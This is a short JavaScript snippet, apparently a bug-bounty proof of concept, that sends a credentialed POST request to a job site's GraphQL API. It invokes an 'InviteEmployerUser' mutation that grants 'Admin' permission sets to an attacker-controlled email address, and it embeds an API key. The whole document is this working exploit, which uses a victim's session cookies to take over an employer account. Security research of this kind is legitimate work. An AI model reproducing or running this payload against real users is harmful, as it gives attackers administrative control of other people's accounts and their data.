const attackerAccount = "Geomecraft+35bugbounty@bugcrowdninja.com"; //<- this should point to your test account
fetch("https://apis.indeed.com/graphql?locale=en-CA&co=CA", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "Indeed-Api-Key": "0f2b0de1b8ff96890172eeeba0816aaab662605e3efebbc0450745798c4b35ae"
    },
    credentials: "include",
    body: JSON.stringify({"operationName":"InviteEmployerUser","variables":{"input":{"emailAddresses":[attackerAccount],"permissionSets":["Admin"],"sendNotification":true,"modalTabType":"DEFAULT"}},"extensions":{},"query":"mutation InviteEmployerUser($input: InviteEmployerUsersInput!) {\n  inviteEmployerUsers(input: $input) {\n    successfullyInvitedUsers {\n      ...InvitedUserFields\n      __typename\n    }\n    successfullyAddedUsers {\n      ...AddedUserFields\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment InvitedUserFields on EmployerUserInvitation {\n  accountKey\n  emailAddress\n  invitedAt\n  permissionSets {\n    id\n    category\n    description\n    name\n    __typename\n  }\n  status\n  __typename\n}\n\nfragment AddedUserFields on EmployerUser {\n  account {\n    id\n    emailAddressButOnlyForPacUse\n    __typename\n  }\n  permissionSets {\n    permissionSet {\n      name\n      __typename\n    }\n    permissionSource\n    __typename\n  }\n  __typename\n}\n"})
})
